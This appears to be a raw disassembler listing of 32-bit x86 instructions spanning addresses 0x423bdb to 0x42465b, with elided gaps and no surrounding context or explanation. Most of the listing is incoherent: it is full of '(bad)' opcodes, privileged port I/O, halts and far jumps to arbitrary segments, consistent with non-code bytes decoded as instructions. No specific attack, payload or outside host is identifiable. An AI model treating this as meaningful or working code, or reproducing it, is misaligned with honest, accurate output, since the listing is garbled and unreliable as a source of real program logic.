  423bdb:	push   0x6a12d2b2
  423be0:	fsub   QWORD PTR [ebx+edi*2]
  423be3:	mov    ds:0x20fb3f70,eax
  423be8:	shl    DWORD PTR [ebx+0x2a],1
  423beb:	or     DWORD PTR [ebx],eax
  423bed:	gs ds pusha 
  423bf0:	sbb    BYTE PTR [eax],ch
  423bf2:	jno    0x423c6d
  423bf4:	fcmovne st,st(3)
  423bf6:	adc    edi,DWORD PTR [edi+0x12]
  423bf9:	push   ebx
  423bfa:	test   DWORD PTR [edx+0x37],esi
  423bfd:	imul   edx,DWORD PTR [edx-0x42c473da],0x313d7aa6
  423c07:	mov    bl,0xd6
  423c09:	xchg   esp,eax
  423c0a:	fisttp DWORD PTR [esi-0x16]
  423c0d:	int3   
  423c0e:	pop    edi
  423c0f:	dec    ebx
	...
  423c74:	std    
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax-0x6cbb99e9]
  423c81:	mov    ebp,esp
  423c83:	add    eax,DWORD PTR [eax+0x400017d]
  423c89:	add    DWORD PTR [eax],eax
  423c8b:	add    BYTE PTR [eax-0x3041f478],ch
  423c91:	daa    
  423c92:	stos   DWORD PTR es:[edi],eax
  423c93:	pop    esp
  423c94:	pusha  
  423c95:	out    dx,eax
  423c96:	daa    
  423c97:	xchg   esi,ecx
  423c99:	xchg   BYTE PTR [ebp+eiz*4+0x556ffd20],cl
  423ca0:	ret    
  423ca1:	loope  0x423cbf
  423ca3:	add    BYTE PTR [ebp+edx*4-0x39],cl
  423ca7:	mov    eax,ds:0x244fae70
  423cac:	jmp    0x423c4a
  423cae:	or     esp,DWORD PTR [edx-0x17fdbaf]
  423cb4:	aaa    
  423cb5:	pop    eax
  423cb6:	cs xchg ebx,eax
  423cb8:	arpl   WORD PTR [eax-0x4853b690],di
  423cbe:	or     BYTE PTR [esi+0x72c50d00],0xfd
  423cc5:	xor    bh,BYTE PTR [edx-0x5e0c205]
  423ccb:	test   ecx,esp
  423ccd:	lahf   
  423cce:	test   al,0x68
  423cd0:	xchg   ecx,eax
  423cd1:	push   0xffffffff
  423cd3:	(bad)  
  423cd4:	sbb    al,0xb1
  423cd6:	sub    dl,BYTE PTR [ebp-0x2c249a08]
  423cdc:	adc    BYTE PTR [edi],al
  423cde:	push   eax
  423cdf:	inc    esi
  423ce0:	dec    edi
  423ce1:	sub    eax,0x3bf38da2
  423ce6:	mov    al,ds:0x10417790
  423ceb:	(bad)  
  423cec:	fdivr  st(3),st
  423cee:	mov    esp,0x19b30667
  423cf3:	cmp    dh,cl
  423cf5:	sbb    eax,0xf8bb0679
  423cfa:	popf   
  423cfb:	lea    ebp,[edi]
  423cfd:	and    BYTE PTR [eax],dl
  423cff:	pop    ebp
  423d00:	pop    ss
  423d01:	iret   
  423d02:	shl    BYTE PTR [eax],0x37
  423d05:	(bad)  
  423d06:	sub    BYTE PTR [edx],cl
  423d08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d09:	inc    esi
  423d0a:	xchg   cl,ah
  423d0c:	hlt    
  423d0d:	pop    ds
  423d0e:	jl     0x423cc8
  423d10:	mov    bh,0x24
  423d12:	out    0x68,al
  423d14:	test   BYTE PTR [eax],0xc6
  423d17:	pop    esp
  423d18:	inc    ecx
  423d19:	(bad)  
  423d1a:	fwait
  423d1b:	es pop edx
  423d1d:	icebp  
  423d1e:	(bad)  
  423d1f:	dec    BYTE PTR [esi]
  423d21:	push   ecx
  423d22:	pop    esi
  423d23:	fist   WORD PTR [edx-0x1617a8b6]
  423d29:	lds    ecx,FWORD PTR [esi-0x22a7ea27]
  423d2f:	pop    ss
  423d30:	pop    es
  423d31:	sbb    edi,DWORD PTR [esi+0x28]
  423d34:	xor    BYTE PTR [ebx],cl
  423d36:	(bad)  
  423d37:	cdq    
  423d38:	pop    ebx
  423d39:	sti    
  423d3a:	imul   ecx,ebx,0x7f
  423d3d:	mov    ds:0x2343afd7,al
  423d42:	jmp    0x423dbb
  423d44:	pop    esp
  423d45:	aam    0x82
  423d47:	adc    dh,BYTE PTR [ecx+esi*4+0x44]
  423d4b:	sub    al,ah
  423d4d:	pop    ss
  423d4e:	jnp    0x423d29
  423d50:	cmp    eax,0xe6989bc0
  423d55:	out    0xf2,eax
  423d57:	es icebp 
  423d59:	mov    ecx,0x23d315f0
  423d5e:	shl    DWORD PTR [ebp-0x7a],cl
  423d61:	pop    edi
  423d62:	in     eax,dx
  423d63:	dec    eax
  423d64:	mov    al,0xb5
  423d66:	add    edi,DWORD PTR [ebp+0x2a]
  423d69:	in     al,dx
  423d6a:	jmp    0x92af:0x28364e2f
  423d71:	xlat   BYTE PTR ds:[ebx]
  423d72:	mov    esp,0xc256fc5d
  423d77:	in     al,dx
  423d78:	imul   ebx,DWORD PTR [ecx-0xa],0x6d
  423d7c:	jnp    0x423d26
  423d7e:	pop    ebp
  423d7f:	retf   
  423d80:	mov    eax,ds:0xedc8acc5
  423d85:	ins    BYTE PTR es:[edi],dx
  423d86:	test   DWORD PTR [eax],ecx
  423d88:	sub    esi,edx
  423d8a:	mov    ah,bl
  423d8c:	xchg   ecx,eax
  423d8d:	jo     0x423e0d
  423d8f:	sub    eax,0x0
	...
  423df4:	(bad)  
  423df5:	test   BYTE PTR [edi-0x118668f7],0xff
  423dfc:	daa    
  423dfd:	mov    DWORD PTR [eax+0x54345ad2],esp
  423e03:	push   ebp
  423e04:	test   BYTE PTR [esi+0x1],bh
  423e07:	add    BYTE PTR [ecx+eax*1],al
  423e0a:	add    BYTE PTR [eax],al
  423e0c:	xlat   BYTE PTR ds:[ebx]
  423e0d:	sub    eax,0x4161a2e2
  423e12:	adc    eax,0x3f7e3cc0
  423e17:	into   
  423e18:	pop    edi
  423e19:	add    eax,0xf97525bb
  423e1e:	pop    ss
  423e1f:	(bad)
  423e23:	rcr    DWORD PTR [edx+edx*1-0x61],cl
  423e27:	and    DWORD PTR [esi],edx
  423e29:	adc    ah,BYTE PTR [ecx-0x36dc21c1]
  423e2f:	push   es
  423e30:	adc    al,0x82
  423e32:	mov    bh,0xcf
  423e34:	sub    BYTE PTR [ecx+0x65d5b0bb],ah
  423e3a:	xor    al,0x2d
  423e3c:	inc    ebx
  423e3d:	and    BYTE PTR [eax-0x77],bl
  423e40:	jmp    0x403f:0x7da63985
  423e47:	leave  
  423e48:	test   al,0x23
  423e4a:	add    eax,0x6b2c43c9
  423e4f:	outs   dx,DWORD PTR ds:[esi]
  423e50:	cmp    ecx,DWORD PTR [eax-0x4d0e27d5]
  423e56:	fild   WORD PTR [ecx+ebp*8+0xdc98785]
  423e5d:	xor    esp,esp
  423e5f:	jle    0x423ebb
  423e61:	pop    ds
  423e62:	inc    edi
  423e63:	(bad)  
  423e64:	sub    ebx,ebp
  423e66:	mov    DWORD PTR [edx+eax*1],edx
  423e69:	aam    0x71
  423e6b:	xchg   edi,eax
  423e6c:	push   DWORD PTR [ecx-0x32a9ed96]
  423e72:	cwde   
  423e73:	hlt    
  423e74:	test   al,0x64
  423e76:	sbb    dl,ah
  423e78:	sub    eax,0x2c63fec5
  423e7d:	and    bl,BYTE PTR [ecx+0x77]
  423e80:	mov    eax,ds:0x6587598c
  423e85:	dec    esp
  423e86:	mov    eax,ds:0x64949429
  423e8b:	sub    al,0x9e
  423e8d:	xor    bl,BYTE PTR [edx+0x35f7811]
  423e93:	lds    esi,FWORD PTR [esi-0x5d2a60d8]
  423e99:	cmp    dh,bl
  423e9b:	je     0x423e31
  423e9d:	inc    edx
  423e9e:	leave  
  423e9f:	mov    ebx,0x71fdc988
  423ea4:	push   edi
  423ea5:	adc    DWORD PTR [ebx+0x22],0xff6ae729
  423eac:	arpl   sp,bp
  423eae:	mov    dl,0xb1
  423eb0:	loope  0x423e87
  423eb2:	lea    esi,[esi-0x7c]
  423eb5:	jmp    0xf060449
  423eba:	xor    cl,BYTE PTR [ecx+0x66]
  423ebd:	inc    edi
  423ebe:	out    dx,eax
  423ebf:	mov    eax,ds:0xb7c11f60
  423ec4:	popa   
  423ec5:	rcl    BYTE PTR [edi+0x30d0d640],cl
  423ecb:	fist   WORD PTR [ebx]
  423ecd:	repz mov ah,0x96
  423ed0:	jne    0x423f01
  423ed2:	nop
  423ed3:	mov    edx,0xff68639e
  423ed8:	in     al,0xee
  423eda:	std    
  423edb:	push   esi
  423edc:	and    eax,0xa6bd6b2c
  423ee1:	je     0x423ee9
  423ee3:	ret    
  423ee4:	add    eax,0x83dff814
  423ee9:	inc    ecx
  423eea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423eeb:	sub    eax,0x4f5ba2f
  423ef0:	out    dx,eax
  423ef1:	push   ebx
  423ef2:	test   ecx,eax
  423ef4:	and    BYTE PTR ds:0xb3631617,al
  423efa:	adc    DWORD PTR [edi],ecx
  423efc:	outs   dx,DWORD PTR ds:[esi]
  423efd:	pop    edi
  423efe:	push   ecx
  423eff:	imul   ebp,DWORD PTR [eax+ebx*2+0x61],0x7aa41792
  423f07:	pop    eax
  423f08:	inc    edx
  423f09:	xor    esi,DWORD PTR [eax+0xdf96205]
  423f0f:	xor    eax,DWORD PTR [eax]
	...
  423f71:	add    BYTE PTR [eax],al
  423f73:	add    BYTE PTR [esi+0x74b9649a],ch
  423f79:	(bad)  
  423f7a:	call   FWORD PTR [edi-0x26e369ec]
  423f80:	mov    ds:0x8884408a,al
  423f85:	jg     0x423f88
  423f87:	add    BYTE PTR [ecx+eax*1],al
  423f8a:	add    BYTE PTR [eax],al
  423f8c:	inc    esi
  423f8d:	push   esp
  423f8e:	pop    esi
  423f8f:	adc    edx,DWORD PTR cs:[esi]
  423f92:	and    esp,eax
  423f94:	push   ebx
  423f95:	ret    
  423f96:	out    dx,eax
  423f97:	retf   
  423f98:	pop    ecx
  423f99:	inc    ebp
  423f9a:	nop
  423f9b:	cmp    eax,0x4c5dc180
  423fa0:	jbe    0x424000
  423fa2:	int    0x7d
  423fa4:	xchg   edx,eax
  423fa5:	lods   eax,DWORD PTR ds:[esi]
  423fa6:	out    dx,al
  423fa7:	and    ah,dl
  423fa9:	jp     0x423ff4
  423fab:	bound  edi,QWORD PTR ds:0xe5cc283
  423fb1:	sbb    eax,0x32c79f7b
  423fb6:	div    BYTE PTR [edi-0x6d]
  423fb9:	loopne 0x424004
  423fbb:	sbb    DWORD PTR fs:[edx],esp
  423fbe:	rcr    BYTE PTR [eax+0xf],1
  423fc1:	ret    0x464f
  423fc4:	mov    eax,ds:0xa62335a0
  423fc9:	ins    DWORD PTR es:[edi],dx
  423fca:	jb     0x423f94
  423fcc:	(bad)  
  423fcd:	lods   eax,DWORD PTR ds:[esi]
  423fce:	jb     0x423f9f
  423fd0:	ds jp  0x42402f
  423fd3:	fild   WORD PTR [ecx+0x28]
  423fd6:	add    eax,0xb5d61685
  423fdb:	neg    BYTE PTR [esp+ebx*1+0x2a27fead]
  423fe2:	retf   
  423fe3:	(bad)  
  423fe5:	aad    0x4b
  423fe7:	test   DWORD PTR [ecx+0x1a829bf0],edi
  423fed:	ret    0x6ea6
  423ff0:	push   edx
  423ff1:	xchg   DWORD PTR [ebx+0xb],ecx
  423ff4:	mov    ds:0xa198e47e,al
  423ff9:	outs   dx,BYTE PTR ds:[esi]
  423ffa:	aas    
  423ffb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ffc:	mov    edi,0x18e6368d
  424001:	xor    dh,BYTE PTR [ecx+0x6bc7a1df]
  424007:	retf   0xc25a
  42400a:	mov    ebx,0xf5186e8
  42400f:	ffree  st(0)
  424011:	out    0x24,al
  424013:	push   cs
  424014:	pop    ss
  424015:	jge    0x423fb0
  424017:	ins    DWORD PTR es:[edi],dx
  424018:	push   esp
  424019:	adc    ah,BYTE PTR [ecx-0x29]
  42401c:	add    al,0xdb
  42401e:	dec    esp
  42401f:	cmp    eax,0xfe8f4c90
  424024:	mov    cl,0x63
  424026:	jo     0x423fd0
  424028:	scas   eax,DWORD PTR es:[edi]
  424029:	adc    bl,bl
  42402b:	xor    dh,bh
  42402d:	add    BYTE PTR [edx],0x0
  424030:	mov    ds,edx
  424032:	mov    bh,0xa8
  424034:	ja     0x42407d
  424036:	dec    ecx
  424037:	lahf   
  424038:	call   0xc7f3:0xbb0d4efe
  42403f:	call   0xd8c4bd72
  424044:	mov    sp,0xd172
  424048:	sub    dh,BYTE PTR [ecx-0x14]
  42404b:	mov    WORD PTR [edx],es
  42404d:	inc    ebp
  42404e:	jnp    0x423ffc
  424050:	push   ebx
  424051:	repnz cmp DWORD PTR [eax],eax
  424054:	mov    cl,0x4c
  424056:	stos   BYTE PTR es:[edi],al
  424057:	out    0xee,al
  424059:	jno    0x424094
  42405b:	lods   eax,DWORD PTR ds:[esi]
  42405c:	pop    es
  42405d:	and    dl,BYTE PTR [eax-0x282718ec]
  424063:	les    eax,FWORD PTR [eax-0x5d7404e8]
  424069:	dec    esp
  42406a:	stc    
  42406b:	clc    
  42406c:	inc    ecx
  42406d:	inc    edx
  42406e:	test   DWORD PTR [esi-0x79],ebp
  424071:	mov    edx,0x34be5a29
  424076:	mov    dl,0xab
  424078:	repnz dec esp
  42407a:	data16 repnz sub al,0xc5
  42407e:	or     BYTE PTR [ebx-0x49],al
  424081:	mov    ecx,0x24b1281b
  424086:	dec    eax
  424087:	mov    BYTE PTR [ecx],dl
  424089:	mov    DWORD PTR [edx-0x19a5e7e9],0x42
	...
  4240f3:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  4240f7:	mov    cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	fldcw  WORD PTR [esi-0x50]
  424103:	push   0x1808c
  424108:	add    al,0x1
  42410a:	add    BYTE PTR [eax],al
  42410c:	lds    edi,FWORD PTR [ebx+0x49]
  42410f:	fdivr  QWORD PTR [eax]
  424111:	leave  
  424112:	js     0x4240b2
  424114:	pushw  cs
  424116:	retf   0x9a62
  424119:	lock inc ebx
  42411b:	or     dh,BYTE PTR [edx+0x2e0385b3]
  424121:	out    dx,eax
  424122:	cmc    
  424123:	cmp    ch,bh
  424125:	stos   DWORD PTR es:[edi],eax
  424126:	xchg   DWORD PTR [edi+0xf],ecx
  424129:	ficomp DWORD PTR [ecx+0x7d]
  42412c:	sbb    bl,ah
  42412e:	cmc    
  42412f:	xchg   ecx,eax
  424130:	neg    DWORD PTR [eax-0x90568ac]
  424136:	xchg   edi,eax
  424137:	es into 
  424139:	cmp    eax,0xbc4aeb6b
  42413e:	sbb    al,0x3d
  424140:	dec    ebx
  424141:	fwait
  424142:	dec    eax
  424143:	cmp    ch,BYTE PTR [esp]
  424146:	mov    ah,0x81
  424148:	daa    
  424149:	scas   al,BYTE PTR es:[edi]
  42414a:	pop    esp
  42414b:	sbb    ecx,DWORD PTR [ecx+0x22239137]
  424151:	mov    eax,ebx
  424153:	add    ebx,esp
  424155:	je     0x42418c
  424157:	mov    edx,0x3266002a
  42415c:	pop    eax
  42415d:	pop    esi
  42415e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42415f:	push   cs
  424160:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424161:	arpl   WORD PTR [ebx-0x39],sp
  424164:	mov    al,0x8
  424166:	jge    0x4241c7
  424168:	aaa    
  424169:	outs   dx,DWORD PTR ds:[esi]
  42416a:	pop    ebp
  42416b:	sbb    eax,0xd1c77b28
  424170:	fs popf 
  424172:	mov    eax,0x55e9a8fa
  424177:	ret    
  424178:	lods   eax,DWORD PTR ds:[esi]
  424179:	mov    esp,0xa924d6e3
  42417e:	clc    
  42417f:	jbe    0x42410a
  424181:	(bad)  
  424182:	jae    0x4241e2
  424184:	xchg   ebp,eax
  424185:	jl     0x424178
  424187:	cmp    DWORD PTR [eax+ebp*8],ebp
  42418a:	rol    BYTE PTR [ecx+0x15],cl
  42418d:	jo     0x424187
  42418f:	imul   ebp,DWORD PTR [edi-0x4f6c7350],0xb6d104d9
  424199:	jl     0x42411b
  42419b:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42419d:	stos   DWORD PTR es:[edi],eax
  42419e:	rol    BYTE PTR cs:[eax+ebp*8+0x7ba95a6e],1
  4241a6:	push   ss
  4241a7:	scas   eax,DWORD PTR es:[edi]
  4241a8:	jmp    0xfa41:0x7fb8f885
  4241af:	and    ch,0xe5
  4241b2:	idiv   ah
  4241b4:	lea    ebp,[esi+0x32]
  4241b7:	ret    0xe3aa
  4241ba:	xchg   esi,eax
  4241bb:	cmp    eax,0x9e8437ba
  4241c0:	shl    DWORD PTR [edi+ecx*1],cl
  4241c3:	or     edx,edi
  4241c5:	lock rol al,cl
  4241c8:	je     0x424196
  4241ca:	aaa    
  4241cb:	mov    ebx,0xa0551f8
  4241d0:	push   es
  4241d1:	pop    edx
  4241d2:	adc    DWORD PTR [edi+ebp*2+0x26],ebx
  4241d6:	mov    ds:0xe0e89fe2,al
  4241db:	loopne 0x424205
  4241dd:	mov    ds:0xd087acb8,al
  4241e2:	test   edx,0xcb966919
  4241e8:	push   edi
  4241e9:	sbb    BYTE PTR gs:[ebp+esi*1-0x48dd699d],al
  4241f1:	retf   
  4241f2:	inc    ecx
  4241f3:	xor    ah,cl
  4241f5:	or     ch,ch
  4241f7:	loope  0x424270
  4241f9:	xchg   ebx,eax
  4241fa:	xor    ah,BYTE PTR [ebx]
  4241fc:	push   edx
  4241fd:	std    
  4241fe:	fistp  QWORD PTR [esi]
  424200:	pop    esp
  424201:	rcr    ah,1
  424203:	fwait
  424204:	mov    cl,0xd0
  424206:	mov    ah,0x61
  424208:	das    
  424209:	jg     0x4241de
  42420b:	clc    
  42420c:	ds stos DWORD PTR es:[edi],eax
  42420e:	call   0x0:0x5d
	...
  424271:	add    BYTE PTR [eax],al
  424273:	add    BYTE PTR [edi-0x4c275c4c],al
  424279:	(bad)  
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	(bad)  
  424281:	jno    0x4242b8
  424283:	cmp    dl,BYTE PTR [eax+0x4000181]
  424289:	add    DWORD PTR [eax],eax
  42428b:	add    bh,bl
  42428d:	pop    edi
  42428e:	mov    cl,0x6c
  424290:	addr16 test eax,0xdbe77166
  424296:	daa    
  424297:	fcom   DWORD PTR [eax+ebp*4+0x4daba3b8]
  42429e:	pop    edx
  42429f:	gs sub eax,0xf936e61
  4242a5:	pop    ss
  4242a6:	pusha  
  4242a7:	xor    al,BYTE PTR [eax]
  4242a9:	(bad)
  4242ac:	inc    ebx
  4242ad:	mov    edx,0x9ef4e2
  4242b2:	jno    0x4242d4
  4242b4:	outs   dx,BYTE PTR ds:[esi]
  4242b5:	cli    
  4242b6:	bound  esp,QWORD PTR [di+0x221f]
  4242bb:	adc    edx,DWORD PTR [ebx]
  4242bd:	cdq    
  4242be:	retf   
  4242bf:	pop    edx
  4242c0:	lahf   
  4242c1:	pop    es
  4242c2:	mov    eax,ds:0x166d2068
  4242c7:	fiadd  WORD PTR [ecx]
  4242c9:	ror    DWORD PTR [eax-0x46cf7167],cl
  4242cf:	ror    DWORD PTR [esi-0x4703d872],cl
  4242d5:	dec    edi
  4242d6:	pop    esi
  4242d7:	mov    esi,0xde3e5cc3
  4242dc:	inc    edx
  4242dd:	inc    ebp
  4242de:	push   ss
  4242df:	aaa    
  4242e0:	sbb    DWORD PTR [eiz*2+0x69d61224],esp
  4242e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242e8:	ror    BYTE PTR [ebp+0x55],0xaf
  4242ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242ed:	in     eax,0xcd
  4242ef:	aas    
  4242f0:	ins    DWORD PTR es:[edi],dx
  4242f1:	loop   0x4242f9
  4242f3:	lods   al,BYTE PTR ds:[esi]
  4242f4:	sar    DWORD PTR [edx],1
  4242f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4242f7:	cmp    ch,ch
  4242f9:	inc    ebx
  4242fa:	popa   
  4242fb:	jecxz  0x42430f
  4242fd:	push   0xffffffd8
  4242ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424300:	retf   0x3f54
  424303:	cmp    DWORD PTR fs:[ebp+0x64],esp
  424307:	retf   
  424308:	cmp    dh,BYTE PTR [eax]
  42430a:	repnz pop ss
  42430c:	or     eax,0x84dd6be2
  424311:	in     al,0x56
  424313:	sbb    bh,dl
  424315:	cmp    eax,0x53204e71
  42431a:	cmp    DWORD PTR [ebp-0x1be17509],edi
  424320:	jge    0x4242bd
  424322:	sbb    DWORD PTR [edi+0x2],ecx
  424325:	inc    eax
  424326:	add    DWORD PTR [edx+ebx*4-0x18],edx
  42432a:	mov    ecx,DWORD PTR [ebx-0x5b9ec2df]
  424330:	(bad)  
  424331:	(bad)  
  424333:	leave  
  424334:	inc    eax
  424335:	adc    edi,esi
  424337:	hlt    
  424338:	add    edx,ebp
  42433a:	mov    eax,0x4cd4761e
  42433f:	clc    
  424340:	rcr    BYTE PTR [eax-0x50],1
  424343:	fdivr  st(1),st
  424345:	add    DWORD PTR [edi],ebp
  424347:	aas    
  424348:	dec    ecx
  424349:	jle    0x4242f9
  42434b:	call   0x90ca:0x46466f1d
  424352:	out    0x38,al
  424354:	xchg   edi,eax
  424355:	test   eax,0x26370a36
  42435a:	push   0xffffffd0
  42435c:	jl     0x4242ff
  42435e:	arpl   WORD PTR [ebp+0xa73d77f],bp
  424364:	hlt    
  424365:	fwait
  424366:	pop    edi
  424367:	fst    QWORD PTR [ebx]
  424369:	jae    0x42439b
  42436b:	ja     0x4243a2
  42436d:	xor    eax,0xaf12fa3c
  424372:	inc    esp
  424373:	dec    BYTE PTR [esi-0x4]
  424376:	(bad)  
  424377:	mul    BYTE PTR [edx-0x74]
  42437a:	push   ecx
  42437b:	sub    BYTE PTR [edi],cl
  42437d:	(bad)  
  42437e:	push   ds
  42437f:	fst    st(0)
  424381:	or     eax,0x277d5042
  424386:	ds push ebp
  424388:	cli    
  424389:	mov    edi,0x380d908
  42438e:	jmp    0x4243a5
	...
  4243f3:	add    BYTE PTR [edx-0x24582da],cl
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x42438a
  424401:	fldenv [edx+0x18294a6]
  424407:	add    BYTE PTR [ecx+eax*1],al
  42440a:	add    BYTE PTR [eax],al
  42440c:	jge    0x4243aa
  42440e:	pop    ebp
  42440f:	loope  0x42440c
  424411:	dec    edx
  424412:	sub    al,0x1
  424414:	out    dx,eax
  424415:	stos   DWORD PTR es:[edi],eax
  424416:	jmp    0x4243f9
  424418:	ins    DWORD PTR es:[edi],dx
  424419:	retf   0x7937
  42441c:	mov    ch,0xb3
  42441e:	jns    0x424431
  424420:	xchg   esi,eax
  424421:	xchg   BYTE PTR [edi-0x32b32015],ch
  424427:	(bad)  
  424428:	iret   
  424429:	push   0xfffffff2
  42442b:	fistp  DWORD PTR [eax]
  42442d:	out    dx,eax
  42442e:	das    
  42442f:	push   ss
  424430:	je     0x424486
  424432:	lock (bad) 
  424434:	cmp    al,0x2d
  424436:	mov    bl,BYTE PTR [ecx-0x3f804841]
  42443c:	mov    bl,0x5
  42443e:	ss mov eax,0x23357f30
  424444:	out    0x56,eax
  424446:	push   esi
  424447:	cli    
  424448:	jg     0x424443
  42444a:	sti    
  42444b:	hlt    
  42444c:	sbb    DWORD PTR [ebp+0x22cbf509],ebx
  424452:	test   DWORD PTR [eax-0x511d5840],ebp
  424458:	into   
  424459:	test   al,0xa5
  42445b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42445c:	rol    ebx,0x1f
  42445f:	inc    esp
  424460:	jecxz  0x4243fa
  424462:	sti    
  424463:	(bad)  
  424464:	call   0xf8738344
  424469:	jmp    0x4244a3
  42446b:	(bad)  
  42446c:	popa   
  42446d:	icebp  
  42446e:	shl    DWORD PTR [ebx],0x27
  424471:	sub    DWORD PTR [eax+0x5d],0xffffffdf
  424475:	scas   eax,DWORD PTR es:[edi]
  424476:	paddusb mm1,QWORD PTR [ebx+eax*1-0x433c0563]
  42447e:	repnz loopne 0x42441c
  424481:	mov    ecx,0xf854b218
  424486:	cwde   
  424487:	arpl   WORD PTR [ebx],si
  424489:	pop    edi
  42448a:	and    bh,BYTE PTR [ebp-0x485eeb5b]
  424490:	std    
  424491:	sbb    al,0xcc
  424493:	sahf   
  424494:	sbb    dl,BYTE PTR [edi+0x48]
  424497:	das    
  424498:	popa   
  424499:	and    BYTE PTR [edi-0x60],0xee
  42449d:	fcomp  QWORD PTR ds:0xd1c7fa23
  4244a3:	rol    DWORD PTR [ecx+0x47],cl
  4244a6:	popf   
  4244a7:	xchg   DWORD PTR [eax+0x15],ebp
  4244aa:	push   ebx
  4244ab:	mov    dh,0xeb
  4244ad:	mov    bh,0x1e
  4244af:	int    0xc1
  4244b1:	test   al,0x55
  4244b3:	bound  edi,QWORD PTR [ecx-0x5d]
  4244b6:	nop
  4244b7:	jle    0x424537
  4244b9:	scas   al,BYTE PTR es:[edi]
  4244ba:	xor    edx,ebx
  4244bc:	addr16 loope 0x4244d8
  4244bf:	les    eax,FWORD PTR [ebp+0x2dd2a273]
  4244c5:	cs inc edx
  4244c7:	ret    
  4244c8:	call   0x8361ed4e
  4244cd:	mov    ds:0x33c59474,eax
  4244d2:	mov    esi,0xafb45d39
  4244d7:	xchg   esi,eax
  4244d8:	out    dx,al
  4244d9:	sub    eax,0xd1b909a
  4244de:	ss mov cl,0xd
  4244e1:	ror    BYTE PTR ss:[edi],1
  4244e4:	cmc    
  4244e5:	aam    0xed
  4244e7:	mov    ch,0x7a
  4244e9:	mov    ecx,0x26a316c3
  4244ee:	fdivr  QWORD PTR [esi]
  4244f0:	adc    esi,ebp
  4244f2:	mov    bh,0xf
  4244f4:	mov    al,ds:0xe2837a42
  4244f9:	dec    ebp
  4244fa:	pusha  
  4244fb:	sbb    al,0xaa
  4244fd:	push   0x7bf4e354
  424502:	xchg   esi,eax
  424503:	and    BYTE PTR [ebx+eiz*1-0x34],dl
  424507:	frstor [esi]
  424509:	jns    0x4244d6
  42450b:	sub    ecx,DWORD PTR [esi+0x46ad32]
	...
  424571:	add    BYTE PTR [eax],al
  424573:	add    al,ah
  424575:	outs   dx,DWORD PTR ds:[esi]
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4+0x67],1
  424581:	add    ebx,DWORD PTR [edx+0x18398b4]
  424587:	add    BYTE PTR [ecx+eax*1],al
  42458a:	add    BYTE PTR [eax],al
  42458c:	je     0x4245c1
  42458e:	stc    
  42458f:	clc    
  424590:	pop    ss
  424591:	cwde   
  424592:	mov    bl,0xac
  424594:	lods   al,BYTE PTR ds:[esi]
  424595:	nop
  424596:	fidivr DWORD PTR [eax+eiz*4]
  424599:	xor    BYTE PTR ds:0xc712ecd2,ch
  42459f:	jecxz  0x424550
  4245a1:	(bad)  
  4245a2:	fcmovne st,st(7)
  4245a4:	xor    bl,BYTE PTR [edx+0x2b]
  4245a7:	sbb    ebp,ebx
  4245a9:	aaa    
  4245aa:	call   0x5bbf:0x7a071713
  4245b1:	and    ebp,DWORD PTR [edx+0x75]
  4245b4:	mov    edx,0x9e14ad82
  4245b9:	cmp    dl,dh
  4245bb:	pushf  
  4245bc:	mov    WORD PTR [ecx+edi*1-0x4c],?
  4245c0:	and    eax,0x93885501
  4245c5:	and    ch,BYTE PTR [eax+eax*8]
  4245c8:	jbe    0x424617
  4245ca:	add    eax,0x103cbf87
  4245cf:	dec    edi
  4245d0:	fdivr  st,st(0)
  4245d2:	(bad)  
  4245d3:	fwait
  4245d4:	xor    edx,DWORD PTR [esi-0x5ea1ebf9]
  4245da:	cli    
  4245db:	sbb    ch,BYTE PTR [ecx]
  4245dd:	pop    ebx
  4245de:	dec    esp
  4245df:	dec    eax
  4245e0:	push   cs
  4245e1:	out    0x53,eax
  4245e3:	ret    0x41e7
  4245e6:	loop   0x424569
  4245e8:	push   ds
  4245e9:	push   ebp
  4245ea:	jmp    0x798bd079
  4245ef:	mov    eax,ds:0x241085d6
  4245f4:	sub    esi,DWORD PTR [ecx+0x76957720]
  4245fa:	outs   dx,BYTE PTR ds:[esi]
  4245fb:	jmp    0xca97e50
  424600:	adc    ah,BYTE PTR [ebx+0x54]
  424603:	mov    DWORD PTR [ebp+0x251ba0ea],edi
  424609:	sub    DWORD PTR [eax-0x4fc8096a],ebx
  42460f:	mov    ecx,0xbfa54a31
  424614:	lea    esi,[edi-0x7eacb57c]
  42461a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42461b:	cmc    
  42461c:	and    BYTE PTR [eax-0x7e],0x39
  424620:	lods   eax,DWORD PTR ds:[esi]
  424621:	dec    ebp
  424622:	xor    bh,cl
  424624:	aad    0x43
  424626:	int3   
  424627:	fwait
  424628:	inc    ecx
  424629:	inc    edx
  42462a:	sar    DWORD PTR [esi+0x5ac1732],0xa1
  424631:	xchg   esi,eax
  424632:	mov    cl,0xf7
  424634:	shl    edi,1
  424636:	je     0x42467b
  424638:	outs   dx,DWORD PTR ds:[esi]
  424639:	dec    esi
  42463a:	push   es
  42463b:	jg     0x4246a7
  42463d:	adc    eax,0xd6774222
  424642:	cmp    dl,BYTE PTR [edx+0x7b2b0e2f]
  424648:	push   edi
  424649:	in     eax,0xfd
  42464b:	test   DWORD PTR [ebp*8+0x445531b3],eax
  424652:	shl    cl,cl
  424654:	repz shl DWORD PTR [ebx-0x37649ef8],cl
  42465b:	push   ebp
